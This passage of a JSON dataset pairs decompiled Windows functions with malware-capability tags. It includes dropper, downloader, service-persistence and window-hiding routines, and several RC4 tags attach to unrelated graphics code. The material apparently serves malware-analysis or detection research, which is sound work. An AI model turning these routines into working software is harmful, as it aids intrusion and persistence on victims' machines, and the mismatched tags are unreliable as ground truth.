    "0040f64c": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f64c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x10), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 56
    },
    "0041f47c": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0041f47c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_WaitForSingleObject(*0x4aa9b8);\n    if (iVar1 == 0) {\n        fcn.0041f470();\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0040fe40": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fe40(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_10h == 0x400) {\n        uVar1 = sub.oleaut32.dll_VariantChangeType(arg_8h, arg_ch, arg_14h, arg_18h);\n    }\n    else {\n        uVar1 = 0x80004001;\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "0041e6ec": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e6ec(uint param_1)\n\n{\n    fcn.0041cd60(param_1);\n    fcn.0040555c();\n    fcn.0040595c();\n    fcn.0041cd60();\n    return;\n}\n",
        "token_count": 61
    },
    "0041fa00": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fa00(uint param_1, int32_t *param_2)\n\n{\n    uint var_4h;\n    \n    (**(*param_2 + 4))(0x41f7c0);\n    (**(*param_2 + 4))(0x41f7cc);\n    return;\n}\n",
        "token_count": 72
    },
    "00428674": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428674(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00428c3c();\n    fcn.00428c3c();\n    sub.gdi32.dll_StretchBlt\n              (in_EAX[1], *in_EDX, in_EDX[1], in_EDX[2] - *in_EDX, in_EDX[3] - in_EDX[1], *(in_ECX + 4), *arg_8h, \n               arg_8h[1], arg_8h[2] - *arg_8h, arg_8h[3] - arg_8h[1], in_EAX[8]);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 216
    },
    "00428b84": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00428b84(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) != 0) && (*(in_EAX + 8) != (~*0x428be0 & *(in_EAX + 8)))) {\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x4aaa28);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x4aaa2c);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x4aaa30);\n        *(in_EAX + 8) = ~*0x428be0 & *(in_EAX + 8);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00428d08": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00428d08(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.0042814c();\n    sub.gdi32.dll_SelectObject(*(in_EAX + 4), uVar1);\n    sub.gdi32.dll_SetROP2(*(in_EAX + 4), *(*(*(in_EAX + 0x10) + 0x18) * 2 + 0x4a1f7c));\n    return;\n}\n",
        "token_count": 112
    },
    "004293a0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004293a0(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = 0xff;\n    do {\n        puVar1 = in_EAX + iVar3 * 4;\n        puVar2 = in_EAX + iVar3 * 3;\n        puVar1[2] = puVar2[2];\n        puVar1[1] = puVar2[1];\n        *puVar1 = *puVar2;\n        puVar1[3] = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *(in_EAX + 3) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "0043fa70": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0043fa70(void)\n\n{\n    fcn.0043f6c8();\n    fcn.0043f6e8();\n    fcn.0043f698();\n    fcn.0043f698();\n    fcn.0043f698();\n    fcn.0043f698();\n    fcn.0043f698();\n    fcn.0043f698();\n    fcn.0043f698();\n    fcn.0043f698();\n    fcn.0043f6e8();\n    fcn.0043f6e8();\n    fcn.0043f698();\n    fcn.0043f698();\n    return;\n}\n",
        "token_count": 150
    },
    "00458158": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458158(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    \n    if (*0x458190 == (*0x45818c & *(in_EAX + 7))) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00467fe0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00467fe0(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x4aaffa);\n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x4aaff8);\n    return;\n}\n",
        "token_count": 81
    },
    "0046d0c8": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046d0c8(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0046d0f0(arg_8h & 0xff, *(in_EAX + 0x43), *(in_EAX + 0x40), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 92
    },
    "0046d0f0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046d0f0(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.0046ca94();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x30))(arg_8h, *((arg_10h & 0xff) * 4 + 0x4a48c8) | *((arg_ch & 0xff) * 4 + 0x4a48d8), arg_18h);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "0048f3d4": {
        "rules": [
            "create or open file",
            "create process on Windows",
            "write file on Windows",
            "extract resource via kernel32 functions",
            "write and execute a file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048f3d4(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    uStack48 = 0x48f4c8;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407958(0, arg_10h, arg_ch);\n    fcn.0048d2c8(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405664(&var_ch);\n    fcn.00405738();\n    uVar2 = fcn.004058fc();\n    uVar2 = func_0x00407890(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    fcn.0048d2c8(0, 0, 5);\n    fcn.00405664(&var_14h);\n    fcn.00405738();\n    uVar1 = fcn.004058fc();\n    uVar2 = 0;\n    func_0x00445970(0, 0x48f4dc, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x48f4cf);\n    return;\n}\n",
        "token_count": 517
    },
    "0048fa94": {
        "rules": [
            "create or open file",
            "create thread",
            "write file on Windows",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048fa94(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    uStack56 = 0x48fbac;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407958(0, arg_10h, arg_ch);\n    fcn.0048d2c8(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405664(0);\n    fcn.00405800(0x48fbc8, 0);\n    uVar2 = fcn.004058fc();\n    uVar2 = func_0x00407890(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 4);\n    fcn.0048d2c8();\n    fcn.00405664(0);\n    fcn.00405800(0x48fbc8, 0);\n    uVar1 = sub.kernel32.dll_CreateThread(0, 0, fcn.0048f9e4, uVar1, 0, &var_ch);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405490(0x48fbb3);\n    return;\n}\n",
        "token_count": 543
    },
    "004515c0": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.004515c0(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4515ea;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x30))();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 126
    },
    "0046cc6c": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0046cc6c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x46ccfe;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar3 = *(in_EAX + 0x34);\n    uVar2 = sub.comctl32.dll_ImageList_Create\n                      (uVar3, *(in_EAX + 0x30), *(*(in_EAX + 0x41) * 4 + 0x4a48e0) | 0xfe, *(in_EAX + 0x38), \n                       *(in_EAX + 0x38));\n    *(in_EAX + 0x3c) = uVar2;\n    cVar1 = fcn.0046ca94();\n    if (cVar1 == '\\0') {\n        fcn.00407480();\n        fcn.0040d9f8();\n        fcn.00404eb4();\n    }\n    if (*(in_EAX + 0x44) != 0x1fffffff) {\n        fcn.0046ce94();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x46cd05);\n    return;\n}\n",
        "token_count": 344
    },
    "00411a2c": {
        "rules": [
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411a2c(uint16_t param_1, uint16_t *param_2)\n\n{\n    if ((*param_2 & 0xfff) < 0x14) {\n        if ((param_1 & 0xfff) < 0x14) {\n            (***0x4a503c)();\n            fcn.0041107c();\n        }\n        else {\n            fcn.00410c3c();\n        }\n    }\n    else {\n        fcn.00411b18();\n        (***0x4a503c)();\n        fcn.0041107c();\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "004616a0": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004616a0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x46173d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.004047cc();\n    if (cVar1 == '\\0') {\n        fcn.00419c9c();\n    }\n    else {\n        (**(*in_EAX + 0x50))();\n        fcn.0046ed14();\n        fcn.0046ee50();\n        fcn.0045ef44();\n        fcn.0046ebac();\n        fcn.0046ef70();\n        (**(*param_2 + 0x34))(in_EAX[0x44], in_EAX[0x45]);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x461744;\n    uStack28 = 0x46173c;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 292
    },
    "0046ee50": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ee50(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405894(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x68))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.004054c0();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00422490": {
        "rules": [
            "persist via Windows service/917cb411848e45f2aea8f119d5b1b71c",
            "persist via Windows service/917cb411848e45f2aea8f119d5b1b71c"
        ],
        "decompiled_code": "\nvoid fcn.00422490(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t iStack132;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x4224b4;\n    fcn.004058ec();\n    uStack52 = 0x4225b6;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack60 = 0xf003f;\n    uStack64 = 0;\n    uStack68 = 0;\n    puStack72 = 0x4224d5;\n    puStack48 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA();\n    if (iVar1 != 0) {\n        uStack76 = 0x42257b;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        fcn.004058fc(0, 0, 0, 0, 0);\n        uVar2 = sub.advapi32.dll_CreateServiceA();\n        fcn.00405664();\n        arg_8h = 0;\n        fcn.00405664();\n        fcn.00405784();\n        fcn.004058fc();\n        fcn.00405664();\n        fcn.00421e28(arg_8h);\n        sub.advapi32.dll_CloseServiceHandle(uVar2);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = iVar1;\n        iStack132 = iVar1;\n    }\n    *in_FS_OFFSET = iStack132;\n    fcn.00405490(0x4225bd);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 511
    },
    "00426df4": {
        "rules": [
            "encode data using XOR",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint16_t __fastcall fcn.00426df4(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint8_t *in_EAX;\n    \n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 << 5 & 0xff00 | (uVar1 << 5 | uVar1 >> 0xb) ^ *in_EAX;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "0048b0c8": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0048b0c8(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    puStack20 = 0x48b0dc;\n    fcn.004058ec();\n    uStack24 = 0x48b158;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0048d2c8();\n    fcn.00405738();\n    fcn.0048e158();\n    fcn.0048d2c8(0x48b178, 0, 0);\n    fcn.00405738();\n    uVar1 = fcn.004058fc();\n    uVar2 = 0;\n    sub.shell32.dll_ShellExecuteA(0, 0x48b17c, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x48b15f);\n    return;\n}\n",
        "token_count": 287
    },
    "00490790": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00490790(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX == 0) {\n        sub.shell32.dll_ShellExecuteA(0, 0x4907e8, 0x4907e0, 0, 0, 5);\n        return;\n    }\n    if (in_EAX == 1) {\n        sub.shell32.dll_ShellExecuteA(0, 0x4907e8, 0x4907f0, 0, 0, 5);\n        return;\n    }\n    if (in_EAX == 3) {\n        fcn.00445c0c();\n        return;\n    }\n    if (in_EAX == 4) {\n        fcn.00445c44();\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "004935c8": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl\nfcn.004935c8\n noreturn \n          (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint uStack40;\n    uint var_20h;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h = &stack0xfffffffc;\n    iVar3 = 6;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puStack32 = 0x4935ec;\n    fcn.00405f08();\n    var_20h = 0x493734;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    var_2ch = 0x4936d5;\n    var_30h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004935c8::var_30h;\n    puStack32 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    uVar1 = fcn.004058fc(0, 0);\n    uVar2 = fcn.004058fc(uVar1);\n    iVar3 = sub.URLMON.DLL_URLDownloadToFileA(0, uVar2);\n    uVar4 = iVar3 == 0;\n    if (uVar4) {\n        fcn.00405784();\n        fcn.004938a4();\n    }\n    else {\n        fcn.00405784();\n        fcn.004938a4();\n    }\n    fcn.00409a78();\n    fcn.00405894();\n    if (uVar4) {\n        sub.shell32.dll_ShellExecuteA(0, 0x493784, uVar1, 0, 0, 5);\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 527
    },
    "0047d008": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0047d008(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x84) != 0) {\n        cVar1 = fcn.00466fb4();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00466ca8();\n            iVar3 = sub.user32.dll_IsWindowVisible(uVar2);\n            if (iVar3 != 0) {\n                cVar1 = (**(**(in_EAX + 0x84) + 0xf0))();\n                if (cVar1 == '\\0') {\n                    fcn.0047ce44();\n                }\n                else {\n                    uVar2 = fcn.00466ca8(0);\n                    sub.user32.dll_ShowWindow(uVar2);\n                    fcn.0045ee64();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "004817b4": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.004817b4(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x4817cc, 0, 5);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 59
    },
    "004817dc": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.004817dc(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x4817f4, 0, 0);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 59
    },
    "0048b7d4": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0048b7d4(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x48b808, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48b818, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48b828, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 121
    },
    "0048b89c": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0048b89c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x48b8c0, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48b8d0, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 94
    },
    "0048b838": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0048b838(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x48b86c, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48b87c, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48b88c, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 122
    },
    "0048b924": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0048b924(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x48b948, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48b958, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 89
    },
    "0048b968": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0048b968(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x48b98c, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48b99c, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 91
    },
    "0048b9d0": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0048b9d0(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x48b9ec, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 69
    },
    "004040f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004040f0(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = in_EAX;\n    if (0xff < param_1) {\n        param_1 = 0xff;\n    }\n    do {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (cVar1 == '\\0') break;\n        pcVar2 = pcVar2 + 1;\n        *pcVar2 = cVar1;\n        param_1 = param_1 - 1;\n    } while (param_1 != 0);\n    *in_EAX = pcVar2 - in_EAX;\n    return;\n}\n",
        "token_count": 177
    },
    "004046a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004046a4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        in_EAX = *(iVar1 + -0x24);\n        if (*(iVar1 + -0x40) != 0) {\n            fcn.00405fd8();\n        }\n    } while (in_EAX != NULL);\n    return;\n}\n",
        "token_count": 96
    },
    "004047f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.004047f0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        while (*in_EAX != param_2) {\n            in_EAX = *(*in_EAX + -0x24);\n            if (in_EAX == NULL) {\n                if (*0x4a6008 != NULL) {\n                    (**0x4a6008)();\n                }\n                fcn.00402fe8();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "0040486c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040486c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == param_2) {\n            return 0x1;\n        }\n        piVar1 = *(in_EAX + -0x24);\n        if (piVar1 == NULL) break;\n        in_EAX = *piVar1;\n    }\n    return piVar1;\n}\n",
        "token_count": 117
    },
    "00405100": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405100(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    iVar3 = *0x4a87d4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x4a87d0 != 0) {\n        iVar1 = *(*0x4a87d0 + 4);\n        uStack24 = 0x405149;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        if (0 < iVar3) {\n            do {\n                iVar3 = iVar3 + -1;\n                pcVar2 = *(iVar1 + 4 + iVar3 * 8);\n                *0x4a87d4 = iVar3;\n                if (pcVar2 != NULL) {\n                    (*pcVar2)();\n                }\n            } while (0 < iVar3);\n        }\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "00405164": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405164(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*0x4a87d0 != NULL) {\n        iVar1 = **0x4a87d0;\n        iVar4 = 0;\n        iVar2 = (*0x4a87d0)[1];\n        uStack28 = 0x4051b1;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        if (0 < iVar1) {\n            do {\n                pcVar3 = *(iVar2 + iVar4 * 8);\n                iVar4 = iVar4 + 1;\n                *0x4a87d4 = iVar4;\n                if (pcVar3 != NULL) {\n                    (*pcVar3)();\n                }\n            } while (iVar4 < iVar1);\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "00405bf8": {
        "rules": [
            "contain loop"
        ],
